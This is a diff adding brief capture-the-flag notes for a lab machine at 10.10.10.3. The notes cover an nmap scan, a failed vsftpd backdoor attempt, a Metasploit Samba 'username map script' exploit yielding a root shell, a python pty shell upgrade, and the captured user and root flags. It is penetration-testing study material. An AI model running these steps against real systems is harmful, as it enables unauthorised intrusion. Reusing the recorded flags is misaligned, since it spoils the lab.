@@ -1,0 +1,18 @@
+nmap -sC -sV -oN nmap 10.10.10.3 -v -A
+
+FTP open in anonymous
+-> nothing inside (ls -all)
+
+searchplsoit vsftpd -> Backdoor Command Execution (Metasploit)
+set RHOSTS = 10.10.10.3
+-> no session created = vuln has been patched
+
+searchsploit Samba 3 -> 'Username' map script' Command Execution (Metasploit)
+set RHOSTS = 10.10.10.3
+-> root shell
+
+which python -> python is there
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+user flag in /home/makis = 69454a937d94f5f0225ea00acd2e84c5
+root flag in /root = 92caac3be140ef409e45721348a4e9df
